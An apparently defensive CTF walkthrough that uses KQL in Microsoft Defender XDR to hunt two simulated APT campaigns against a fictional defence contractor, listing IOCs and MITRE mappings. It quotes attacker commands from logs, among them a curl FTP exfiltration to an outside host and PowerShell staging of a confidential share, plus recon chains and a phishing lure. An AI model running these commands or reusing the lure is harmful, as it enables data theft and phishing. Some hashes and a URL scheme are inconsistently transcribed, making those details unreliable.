---
title: "Titan Shield: Microsoft Defender XDR CTF Walkthrough"
date: 2026-05-10
tags:
  - ctf
  - writeup
  - microsoft-defender
  - xdr
  - threat-hunting
  - kql
  - moonstone-sleet
  - crimson-sandstorm
  - social-engineering
  - phishing
  - apt
status: complete
aliases: []
tldr: "Comprehensive CTF scenario investigating two APT campaigns (Moonstone Sleet and Crimson Sandstorm) targeting TitanShield using Microsoft Defender XDR, covering social engineering via LinkedIn, malicious game distribution, macro-laden Excel files, romance scams, and data exfiltration—all analyzed using KQL queries."
---

# Titan Shield: Microsoft Defender XDR CTF Walkthrough

![[assets/Screenshot-2026-05-08-at-65941-PM.png]]
*KQL query identifying James Douglas's hostname as UB9I-DESKTOP, enabling device-specific investigation of malicious game installation.*


![[assets/Screenshot-2026-05-08-at-71815-PM.png]]
*Investigation reveals Christopher Taylor's role as Network Engineer, a privileged position that makes him a valuable target for attackers.*


![[assets/Screenshot-2026-05-08-at-70129-PM.png]]
*Defender XDR article identifying the attack as 'Moonstone Sleet using malicious tank game to infect devices', linking the IOC to a known threat actor campaign.*


![[assets/Screenshot-2026-05-08-at-70043-PM.png]]
*SHA256 hash (56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c) of the malicious game file identified in the investigation.*


![[assets/Screenshot-2026-05-08-at-71927-PM.png]]
*KQL query showing the Employees table filtered for user 'chtaylor', returning employee details including username, role, hostname, and company domain.*


## Challenge Overview

**Platform:** KC7 Cyber (kc7001.eastus)  
**Category:** Threat Hunting / Digital Forensics  
**Points:** 4110 (65 challenges)  
**Difficulty:** Intermediate  
**Author:** David Brown  
**Company:** TitanShield  
**Tools:** [[Microsoft Defender XDR]], [[Kusto Query Language]]

This CTF showcases the capabilities of Microsoft Defender XDR through two sophisticated attack campaigns targeting TitanShield, a defense contractor. Participants investigate social engineering, phishing, malware distribution, and data exfiltration using KQL queries across multiple telemetry tables.

## Reconnaissance / Enumeration

### Section 1: All Fun and Games (Moonstone Sleet Campaign)

#### LinkedIn TMI
**Scenario:** An employee (James Douglas, Lead Defense Engineer) reported strange computer behavior after installing a game promoted on LinkedIn.

**LinkedIn Post Analysis:**
- **User:** James Douglas
- **Post Content:** "Wow! This new tank game, DeTankWar, is so much fun! If you haven't already downloaded it, what are you waiting for?"
- **URL:** `https://lnkd.in/gq5FVQqF`
- **Posted:** 2 days ago


> [!WARNING]
> Social media platforms like LinkedIn are increasingly used for targeted social engineering attacks against corporate employees, especially in defense and technology sectors.

#### Game Identification
**Question:** What was the name of the game James mentioned?


#### Finding James' Hostname
**KQL Query:**
```kql
Employees
| where name == "James Douglas"
```

**Result:**
- **Hostname:** `UB9I-DESKTOP`
- **Username:** jadouglas


#### File Creation Events
**KQL Query:**
```kql
FileCreationEvents
| where hostname == "UB9I-DESKTOP"
| where filename has "DeTankWor"
```

**Result:**
| Timestamp | Hostname | Username | SHA256 | Path | Filename | Process |
|-----------|----------|----------|--------|------|----------|---------|
| 7/9/2024, 2:59:23 PM | UB9I-DESKTOP | jadouglas | 5655417d96d12bd35D4ebef2a8f28e790dd1fe583c33a | C:\Users\jadouglas\Downloads\ | DeTankWar[.]exe | chrome[.]exe |


> [!NOTE]
> The file was downloaded via Chrome, indicating web-based delivery of the malicious game.

#### SHA256 Hash

#### Threat Intelligence Lookup
**Instruction:** Look up the hash in Microsoft Defender XDR Intel Explorer Tool.


#### Malicious File Score
**Microsoft Defender XDR Analysis:**
- **Reputation Score:** 100 (Malicious - High Confidence)
- **Last Seen:** 2024-08-04
- **Indicators:**
  - **High Severity:** Cyber Threat Intelligence - Moonstone Sleet
  - **Medium Severity:** Indicator related to a known Malware campaign


#### Threat Actor Attribution
**Intel Profile:**
- **Threat Actor:** Moonstone Sleet (formerly Storm-1789)
- **Origin:** North Korea
- **Type:** Nation-state activity group
- **Targets:** Software development, IT, education, defense industrial base
- **Goals:** Espionage and revenue generation

**Associated Article:** "Moonstone Sleet using malicious tank game to infect devices"


### Section 2: It's Giving Sleet (Threat Actor Profile)

#### Article Title

#### Country of Origin

#### Targeted Sectors
**Question:** Moonstone Sleet targets individuals and organizations within software development, information technology, education, and __ sectors.


#### Attack Goals
**Targeting Details:**
- Primary goals: Espionage and revenue generation
- **Timeline:**
  - Early December 2023: Compromised defense technology company
  - Early January 2024: Fake software development companies
  - April 2024: Ransomed organization using FakePenny ransomware
  - April 2024: Compromised drone technology company
  - May 2024: Compromised aircraft parts manufacturer


#### Related Threat Actor
**Intelligence:** Moonstone Sleet initially demonstrated significant overlap with Diamond Sleet (another North Korean threat actor) in tactics, techniques, and procedures.


#### Campaign Start Date
**Campaign:** Moonstone Sleet using malicious tank game

**Details:**
- **Start Date:** February 2024
- **Distribution:** Social media, direct contact, gaming/education/software development sectors
- **Game:** DeTankWar - fully functional downloadable game requiring registration (username/password and invite code)
- **Attack Chain:** Initial access → Lateral movement → Extensive data exfiltration


#### Initial Access Vectors
**Campaign Details:**
Moonstone Sleet approached targets through messaging platforms and email, presenting itself as a game developer seeking investment or developer support. The group masqueraded as legitimate blockchain companies or used fake companies, presenting DeTankWar as an NFT-enabled, play-to-earn game.

**Sample Phishing Email:**
```
From: Joseph Miller
Subject: NFT Game Investment Opportunity

Dear [Recipient],

I hope this message finds you well.

I am reaching out to discuss an exciting investment opportunity in an NFT game project that is nearing completion. The C.C Waterfail is currently in the process of developing a new play-to-earn (P2E) game titled "DeTankWar." We finished beta version of the game but need expert game developers because of issues and new version.

Would you interested in learning more about this opportunity?

Best regards,
Joseph Miller
Project: https://www.detankwar.com/?en/index
```


#### Phishing Domain

#### Email Search
**KQL Query:**
```kql
Email
| where link has "detankwar.com"
| count
```


#### Targeted Employees
**KQL Query:**
```kql
Email
| where link has "DeTankWar"
| distinct recipient
```

**Targeted TitanShield Employees:**
1. ethan_johnson[@]titanshield[.]com
2. amir_ali[@]titanshield[.]com
3. ryan_patel[@]titanshield[.]com
4. james_douglas[@]titanshield[.]com
5. lucas_nguyen[@]titanshield[.]com
6. henry_kim[@]titanshield[.]com


#### Employee Role Analysis
**KQL Query:**
```kql
Email
| where link has "DeTankWar"
| distinct recipient
| join kind=inner Employees on $left.recipient==$right.email_addr
| distinct email_addr, name, role
```

**Results:**
| Email | Name | Role |
|-------|------|------|
| ethan_johnson[@]titanshield[.]com | Ethan Johnson | Defense Engineer |
| amir_ali[@]titanshield[.]com | Amir Ali | Defense Engineer |
| ryan_patel[@]titanshield[.]com | Ryan Patel | Defense Engineer |
| james_douglas[@]titanshield[.]com | James Douglas | Lead Defense Engineer |
| lucas_nguyen[@]titanshield[.]com | Lucas Nguyen | Defense Engineer |
| henry_kim[@]titanshield[.]com | Henry Kim | Defense Engineer |


### Section 3: Perfectly Executed (Post-Exploitation)

#### Malicious DLL Count
**KQL Query:**
```kql
FileCreationEvents
| where filename in~ ("nvunityplugin.dll","unityplayer.dll")
| count
```

**Context:** The malicious tank game included trojanized DLLs.


#### DLL Hash
**KQL Query:**
```kql
FileCreationEvents
| where filename in~ ("nvunityplugin.dll","unityplayer.dll")
```

**Result:**
| Timestamp | Hostname | Username | SHA256 |
|-----------|----------|----------|--------|
| 7/8/2024, 4:30:33 PM | XDNT-DESKTOP | amali | 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38 |


#### DLL Attribution
**Microsoft Defender XDR Analysis:** The hash is attributed to Moonstone Sleet.


#### Data Exfiltration Command
**KQL Query:**
```kql
ProcessEvents
| where process_commandline has "curl" and process_commandline has_any ("mingloem.com","matrixane.com")
```

**Exfiltration Command:**
```bash
curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass
```

**Details:**
- **File Exfiltrated:** C:\ReadyToGo\TopSecret[.]zip
- **Destination:** fxp://matrixane[.]com/upload/
- **Credentials:** exfil:tankpass
- **Timestamp:** 7/26/2024, 12:02:45 PM


> [!TIP]
> Monitoring for command-line tools like curl, wget, or certutil used for outbound file transfers is critical for detecting data exfiltration.

#### Compression Source Path
**KQL Query:**
```kql
ProcessEvents
| where process_commandline has "TopSecret.zip"
```

**Data Staging Command:**
```powershell
Compress-Archive -Path C:\StagingArea\* -DestinationPath C:\ReadyToGo\TopSecret.zip
```

**Details:**
- **Timestamp:** 7/26/2024, 11:18:07 AM
- **Parent Process:** cmd[.]exe
- **Process:** powershell[.]exe


#### Stolen Data Source
**KQL Query:**
```kql
ProcessEvents
| where process_commandline has "StagingArea"
```

**Data Collection Command:**
```powershell
Copy-Item -Path \\company_share\confidential\defense\project_omega\* -Destination C:\StagingArea\ -Recurse
```

**Details:**
- **Timestamp:** 7/26/2024, 10:30:07 AM
- **Source:** \\company_share\confidential\defense\project_omega\*
- **Destination:** C:\StagingArea\
- **Project:** Project Omega (top-secret defense project)


> [!WARNING]
> The attacker successfully exfiltrated classified defense project data (Project Omega) from a network share.

#### Investigation Complete
**Narrative:** The investigation revealed Moonstone Sleet stole data related to Project Omega through:
1. Social engineering via LinkedIn
2. Malicious game distribution
3. Trojanized DLLs
4. Hands-on-keyboard data staging
5. FTP exfiltration


### Section 4: A Love Story 💔 (Crimson Sandstorm Campaign)

#### Alert Investigation
**Alert Details:**
- **Alert Type:** Suspicious discovery command execution detected
- **User:** chtaylor (Christopher Taylor)
- **Severity:** High
- **Status:** Active
- **Activity Time:** 07/20/24, 03:58 AM UTC
- **Description:** Suspicious command 'whoami' was executed on a device

**KQL Query:**
```kql
Employees
| where username == "chtaylor"
```

**Employee Profile:**
- **Name:** Christopher Taylor
- **Hostname:** IL5M-DESKTOP
- **IP Address:** 10.10.0.79
- **Email:** christopher_taylor[@]titanshield[.]com
- **Role:** Network Engineer
- **Hire Date:** 8/30/2022
- **MFA Enabled:** False


> [!WARNING]
> MFA was not enabled for this account, making it more vulnerable to compromise.

#### Discovery Command Timestamp
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline has "whoami"
```

**Result:**
- **Timestamp:** 7/20/2024, 3:58:19 AM
- **Parent Process:** cmd[.]exe
- **Command:** cmd[.]exe /c echo PC


#### Full Command Line
**Full Command:**
```cmd
cmd.exe /c echo PC and User Names -------- >>%temp%\Logs.txt && whoami >>%temp%\Logs.txt
```

**Attack Technique:** The attacker chained commands to log system information to a temporary file.


#### Reconnaissance Activity Count
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline has_all("echo", ">>", "logs.txt")
| count
```


#### Log File Location
**Discovered Command Pattern:**
```cmd
cmd.exe /c echo Date and Time -------- >>%temp%\Logs.txt && date /t >>%temp%\Logs.txt && time /t >>%temp%\Logs.txt
```


#### Russian Email Provider
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline has_all("echo", ">>", "logs.txt", "ping")
```

**Discovered Command:**
```cmd
cmd.exe /c echo Ping Status -------- >>%temp%\Logs.txt && ping yandex.com -n 1 >>%temp%\Logs.txt
```

**Context:** Yandex is a Russian email and search engine provider, potentially used for C2 connectivity testing.


#### WMIC Software Enumeration
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline has_all("echo", ">>", "logs.txt", "wmic")
```

**Discovered Command:**
```cmd
cmd.exe /c echo Software -------- >>%temp%\Logs.txt && wmic product get name,version >>%temp%\Logs.txt
```


#### Employee Role Verification
**Question:** What is Taylor's job role?


> [!NOTE]
> The investigator initially considered whether these commands were legitimate for a Network Engineer's duties.

#### Organization-Wide Search
**KQL Query:**
```kql
ProcessEvents
| where process_commandline has_all("echo", ">>", "logs.txt")
| count
```

**Result:** 663 total hits across the organization


#### Affected Hostnames
**KQL Query:**
```kql
ProcessEvents
| where process_commandline has_all("echo", ">>", "logs.txt")
| distinct hostname
| count
```


#### Affected Employee Roles
**KQL Query:**
```kql
let usersH =
ProcessEvents
| where process_commandline has_all("echo", ">>", "logs.txt")
| distinct hostname;
Employees
| where hostname in (usersH)
| sort by role
```

**Affected Employees (15 total):**
- 1 Senior Network Engineer (David Jackson)
- 14 Network Engineers

**Most Prevalent Role:** Network Engineer


#### Other Job Role

#### Earliest Suspicious Command
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline contains "echo"
```

**Discovered Commands Timeline:**
| Timestamp | Command Fragment |
|-----------|------------------|
| 7/17/2024, 10:47:43 AM | echo Date and Tim |
| 7/20/2024, 3:58:19 AM | echo PC and User I |
| 7/20/2024, 3:59:11 AM | echo System Inform |
| 7/20/2024, 4:01:20 AM | echo Antivirus ---- |
| 7/20/2024, 4:02:26 AM | echo Software ---- |
| 7/20/2024, 4:03:01 AM | echo Net Users --- |
| 7/20/2024, 4:03:55 AM | echo Ping Status - |


#### Macro File Discovery
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where process_commandline contains "macro"
```

**Result:**
- **Timestamp:** 7/17/2024, 10:11:43 AM
- **Parent Process:** EXCEL[.]EXE
- **Command Line:** C:\temp\macro.xlsm


#### Malicious Excel File
**KQL Query:**
```kql
ProcessEvents
| where hostname == "IL5M-DESKTOP"
| where timestamp <= datetime(2024-07-17T10:11:43.000Z)
| sort by timestamp desc
```

**Result:**
```
"C:\Program Files\Microsoft Office\Office16\EXCEL.EXE" "C:\Users\chtaylor\Downloads\New_Diet_Plan_For_My_Love.xlsx"
```


> [!WARNING]
> The file name suggests a romance scam lure targeting the victim's personal interests.

#### Excel File Hash
**KQL Query:**
```kql
FileCreationEvents
| where hostname == "IL5M-DESKTOP"
| where filename == "New_Diet_Plan_For_My_Love.xlsx"
```

**Result:**
| Timestamp | Hostname | Username | SHA256 |
|-----------|----------|----------|--------|
| 7/17/2024, 10:10:51 AM | IL5M-DESKTOP | chtaylor | 6aeef036eb85a470dbd6d039250172a5108627b873e8b3b79fae5a7dd767e73 |


#### File Download Process

> [!NOTE]
> The file was downloaded via Microsoft Edge browser, indicating web-based delivery.

#### Christopher Taylor's IP
**KQL Query:**
```kql
Employees
| where name contains "taylor"
```

**Results:**
- Taylor Chirino: 10.10.0.162
- **Christopher Taylor: 10.10.0.79**


#### Download URL
**KQL Query:**
```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.79"
| where url has "New_Diet_Plan_For_My_Love.xlsx"
```

**Result:**
- **URL:** hxxps://healthylifestyle[.]com/share/New_Diet_Plan_For_My_Love.xlsx
- **Method:** GET
- **Timestamp:** 7/17/2024, 10:09:58 AM


### Section 5: A Heartbreak (Romance Scam Analysis)

#### Email Sender
**KQL Query:**
```kql
Email
| where link has "https://healthylifestyle.com/share/New_Diet_Plan_For_My_Love.xlsx"
```

**Result:**
- **Sender:** marcella_flores[@]gmail[.]com
- **Recipient:** christopher_taylor[@]titanshield[.]com
- **Timestamp:** 7/17/2024, 2:34:41 AM
- **Subject:** [EXTERNAL] RE: Relax wi


#### Email Subject

#### Social Engineering Context
**Narrative:** The employee revealed he was in an online relationship with the sender for several months. She promised to help him with his health goals and asked him to fill out the spreadsheet and send it back.


> [!WARNING]
> Classic romance scam targeting lonely individuals, building trust over months before delivering malicious payload.

#### Campaign Email Count
**KQL Query:**
```kql
Email
| where sender == "marcella_flores@gmail.com"
| count
```


#### Malicious Domains
**KQL Query:**
```kql
Email
| where sender == "marcella_flores@gmail.com"
| extend domain = parse_url(link).Host
| distinct tostring(domain)
```

**Domains:**
1. outlook-services[.]com
2. yogalifestyle[.]com
3. healthylifestyle[.]com


#### Additional Recipients
**KQL Query:**
```kql
Email
| where sender == "marcella_flores@gmail.com"
```

**Additional Recipients:**
- david_mohamed[@]titanshield[.]com
- james_miller[@]titanshield[.]com
- george_rivera[@]titanshield[.]com
- cora_stringer[@]titanshield[.]com
- essie_coronel[@]titanshield[.]com

#### Passive DNS Resolution
**KQL Query:**
```kql
PassiveDns
| where domain in ("outlook-services.com","yogalifestyle.com")
| distinct ip
```

**IP Addresses:**
- 208.199[.]30[.]154
- 202.241[.]233[.]180


#### Reconnaissance Table
**Question:** If the actor conducted reconnaissance against our company, which table would we find that activity in?


#### Reconnaissance Event Count
**KQL Query:**
```kql
InboundNetworkEvents
| where src_ip in ("208.199.30.154","202.241.233.180")
| count
```


#### Reconnaissance Start Time
**KQL Query:**
```kql
InboundNetworkEvents
| where src_ip in ("208.199.30.154","202.241.233.180")
```


#### Social Media Reconnaissance
**KQL Analysis:**
```kql
InboundNetworkEvents
| where src_ip in ("208.199.30.154","202.241.233.180")
```

**Discovered Request:**
- **URL:** hxxps://titanshield[.]com/about-us/team/sibongile-sithole
- **Referrer:** hxxps://www.linkedin[.]com
- **Status Code:** 200
- **User Agent:** Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_9 rv:6.0; bn-BD)

**Context:** The threat actor used LinkedIn to research TitanShield employees before launching attacks.


#### Data Exfiltration Target
**Context:** After executing malicious commands, the attacker moved to data exfiltration phase.

**KQL Query:**
```kql
Email
| where recipient contains "david_jackson"
```

**Result:** David Jackson was targeted for data exfiltration.


#### David Jackson's IP
**KQL Query:**
```kql
Employees
| where name contains "david"
```

**David Jackson Profile:**
- **IP Address:** 10.10.0.8
- **Hostname:** 2XWD-DESKTOP
- **Username:** dajackson
- **Email:** david_jackson[@]titanshield[.]com
- **Role:** Senior Network Engineer
- **Hire Date:** 2022-08-18
- **MFA Enabled:** True


#### EDR Search Timestamp
**KQL Query:**
```kql
OutboundNetworkEvents
| where src_ip contains "10.10.0.8"
| where url contains "edr"
```

**Context:** David Jackson searched Google about "EDR alerts" — potentially indicating he was aware of detection or trying to understand security alerts.


#### Relationship Investigation
**KQL Query:**
```kql
OutboundNetworkEvents
| where src_ip contains "10.10.0.8"
| where url contains "talk"
```

**Discovered Search:**
```
https://www.google.com/search?q=why+doesn%27t+my+girlfriend+talk+to+me+on+Thursdays+or+Fridays
```


> [!NOTE]
> This personal search suggests the victim was emotionally invested in the fake relationship, making the romance scam more effective.

#### Total Google Searches
**KQL Query:**
```kql
OutboundNetworkEvents
| where src_ip contains "10.10.0.8"
| where url contains "search" and url contains "google"
```


## Exploitation / Solution Steps

### Attack Chain 1: Moonstone Sleet

1. **Initial Access (T1566.002 - Phishing: Spearphishing Link)**
   - Attacker posted malicious LinkedIn promotion for DeTankWar game
   - Sent phishing emails with links to `detankwar.com`
   - Targeted Defense Engineers at TitanShield

2. **Execution (T1204.002 - User Execution: Malicious File)**
   - Victim (James Douglas) downloaded `DeTankWar.exe`
   - SHA256: `56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c`
   - Reputation: Malicious (Score 100)

3. **Persistence (T1574.002 - DLL Side-Loading)**
   - Malicious DLLs deployed: `nvunityplugin.dll`, `unityplayer.dll`
   - SHA256: `09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38`

4. **Collection (T1560.001 - Archive via Utility)**
   ```powershell
   Copy-Item -Path \\company_share\confidential\defense\project_omega\* -Destination C:\StagingArea\ -Recurse
   Compress-Archive -Path C:\StagingArea\* -DestinationPath C:\ReadyToGo\TopSecret.zip
   ```

5. **Exfiltration (T1048.003 - Exfiltration Over Alternative Protocol)**
   ```bash
   curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass
   ```

### Attack Chain 2: Crimson Sandstorm

1. **Reconnaissance (T1593.001 - Search Open Websites/Domains)**
   - Attacker researched TitanShield employees on LinkedIn
   - Identified potential targets via social media profiles
   - Started: 2024-07-05

2. **Resource Development (T1585.001 - Establish Accounts: Social Media)**
   - Created fake persona: Marcella Flores (marcella_flores[@]gmail[.]com)
   - Established multi-month relationship with Christopher Taylor
   - Built trust through health/wellness themes

3. **Initial Access (T1566.001 - Phishing: Spearphishing Attachment)**
   - Email subject: "[EXTERNAL] RE: Relax with these yoga poses, baby! 🧘"
   - Malicious attachment: `New_Diet_Plan_For_My_Love.xlsx`
   - SHA256: `6aeef036eb85a470dbd6d039250172a5108627b873e8b3b79fae5a7dd767e73`
   - Downloaded from: `https://healthylifestyle.com/share/`

4. **Execution (T1204.002 - Malicious File: Macro Execution)**
   - Excel file executed macro: `C:\temp\macro.xlsm`
   - Timestamp: 2024-07-17T10:11:43Z
   - Parent process: EXCEL.EXE

5. **Discovery (T1590 - Gather Victim Network Information)**
   - 39 recon commands executed on IL5M-DESKTOP
   - Logged to `%temp%\Logs.txt`
   - Commands: whoami, systeminfo, wmic, netstat, ping yandex[.]com

6. **Lateral Movement (T1078 - Valid Accounts)**
   - Recon commands executed across 15 machines (663 total hits)
   - Targeted Network Engineers and Senior Network Engineers

7. **Exfiltration (T1048 - Exfiltration Over Alternative Protocol)**
   - Target: David Jackson (Senior Network Engineer, dajackson)
   - David searched Google for EDR alerts — indicating awareness of detection

---

## IOC Table

| Type | Indicator | Context | Threat Actor |
|------|-----------|---------|--------------|
| File | DeTankWar[.]exe | Malicious game delivered via LinkedIn/email | Moonstone Sleet |
| Hash | 56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c | DeTankWar.exe SHA256 | Moonstone Sleet |
| Hash | 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38 | nvunityplugin.dll / unityplayer.dll SHA256 | Moonstone Sleet |
| Hash | 6aeef036eb85a470dbd6d039250172a5108627b873e8b3b79fae5a7dd767e73 | New_Diet_Plan_For_My_Love.xlsx SHA256 | Crimson Sandstorm |
| Domain | detankwar[.]com | Phishing/malware delivery domain | Moonstone Sleet |
| Domain | matrixane[.]com | FTP exfiltration endpoint | Moonstone Sleet |
| Domain | healthylifestyle[.]com | Malicious Excel delivery | Crimson Sandstorm |
| Domain | yogalifestyle[.]com | Phishing domain | Crimson Sandstorm |
| Domain | outlook-services[.]com | Phishing domain | Crimson Sandstorm |
| IP | 208.199[.]30[.]154 | Crimson Sandstorm recon/C2 | Crimson Sandstorm |
| IP | 202.241[.]233[.]180 | Crimson Sandstorm recon/C2 | Crimson Sandstorm |
| Email | marcella_flores[@]gmail[.]com | Fake persona — romance scam operator | Crimson Sandstorm |
| File | New_Diet_Plan_For_My_Love[.]xlsx | Macro-laden Excel delivered via romance scam | Crimson Sandstorm |
| File | nvunityplugin[.]dll | Malicious DLL side-loaded by DeTankWar | Moonstone Sleet |
| File | unityplayer[.]dll | Malicious DLL side-loaded by DeTankWar | Moonstone Sleet |
| Account | jadouglas | Compromised — downloaded DeTankWar | Moonstone Sleet |
| Account | chtaylor | Compromised — romance scam victim | Crimson Sandstorm |
| Account | dajackson | Targeted — Senior Network Engineer | Crimson Sandstorm |

---

## MITRE ATT&CK Mapping

### Moonstone Sleet Campaign

| Tactic | Technique ID | Technique | Evidence |
|--------|-------------|-----------|----------|
| Reconnaissance | T1593.001 | Search Open Websites: Social Media | LinkedIn used to promote DeTankWar game |
| Resource Development | T1585.002 | Establish Accounts: Email Accounts | Fake company persona for phishing |
| Initial Access | T1566.002 | Phishing: Spearphishing Link | detankwar[.]com links sent via email to 6 employees |
| Execution | T1204.002 | User Execution: Malicious File | James Douglas executed DeTankWar[.]exe |
| Persistence | T1574.002 | Hijack Execution Flow: DLL Side-Loading | nvunityplugin.dll, unityplayer.dll |
| Collection | T1039 | Data from Network Shared Drive | `\\company_share\confidential\defense\project_omega\*` |
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Compress-Archive → TopSecret.zip |
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol | curl FTP to matrixane[.]com |

### Crimson Sandstorm Campaign

| Tactic | Technique ID | Technique | Evidence |
|--------|-------------|-----------|----------|
| Reconnaissance | T1593.001 | Search Open Websites: Social Media | LinkedIn recon of TitanShield employees from 208.199[.]30[.]154 |
| Resource Development | T1585.001 | Establish Accounts: Social Media | Fake persona Marcella Flores built over months |
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | New_Diet_Plan_For_My_Love.xlsx via romance scam |
| Execution | T1204.002 | User Execution: Malicious File | Excel macro execution — C:\temp\macro.xlsm |
| Discovery | T1590 | Gather Victim Network Information | 47 recon events against titanshield[.]com |
| Collection | T1213 | Data from Information Repositories | Targeted Senior Network Engineer David Jackson |

---

## Tools Used

- **[[Microsoft Defender XDR]]** — Primary investigation platform
- **[[Kusto Query Language]] (KQL)** — All queries written from scratch across Email, FileCreationEvents, ProcessEvents, OutboundNetworkEvents, InboundNetworkEvents, PassiveDns, Employees tables
- **Defender XDR Intel Explorer** — Threat intelligence lookup for SHA256 hashes and actor profiles
- **[[MITRE ATT&CK]]** — TTP mapping framework for both campaigns

---

## Key Learnings

1. **Dual-campaign complexity** — This scenario required simultaneously tracking two distinct APT campaigns (Moonstone Sleet and Crimson Sandstorm) with different TTPs, targets, and objectives — mirroring real-world MSSP environments where multiple threats run concurrently.

2. **LinkedIn as an attack vector** — Both campaigns leveraged LinkedIn for reconnaissance and delivery. Moonstone Sleet used it to promote malicious software; Crimson Sandstorm used it to identify and profile targets before the romance scam.

3. **DLL side-loading for persistence** — Moonstone Sleet embedded malicious DLLs inside a functional game to evade detection. The game worked as advertised, reducing suspicion while persistence was established.

4. **Romance scams in corporate targeting** — Crimson Sandstorm's multi-month trust-building campaign against Christopher Taylor demonstrates that social engineering extends well beyond email phishing — patience and emotional manipulation are powerful attack tools.

5. **KQL cross-table correlation** — Effective investigation required joining Employees, Email, FileCreationEvents, ProcessEvents, OutboundNetworkEvents, InboundNetworkEvents, and PassiveDns tables — the core skill tested throughout this module.

6. **Defender XDR as unified SOC platform** — Microsoft Defender XDR's integration of endpoint, email, identity, and network telemetry into a single KQL query surface significantly accelerates investigation compared to siloed tools.

---

## References

- [MITRE ATT&CK: Moonstone Sleet](https://attack.mitre.org/groups/G1036/)
- [Microsoft Threat Intelligence: Moonstone Sleet](https://www.microsoft.com/en-us/security/blog/2024/05/28/moonstone-sleet-emerges-as-new-north-korean-threat-actor-with-new-bag-of-tricks/)
- [MITRE ATT&CK: Crimson Sandstorm](https://attack.mitre.org/groups/G0003/)
- [MITRE ATT&CK: DLL Side-Loading T1574.002](https://attack.mitre.org/techniques/T1574/002/)
- [MITRE ATT&CK: Romance Scam / Social Engineering](https://attack.mitre.org/techniques/T1585/001/)
- [KC7 Cyber](https://kc7cyber.com)
- [Microsoft Defender XDR Documentation](https://learn.microsoft.com/en-us/defender-xdr/)

---

*Author: David Brown | Platform: KC7 | Date: 2026-05-10*
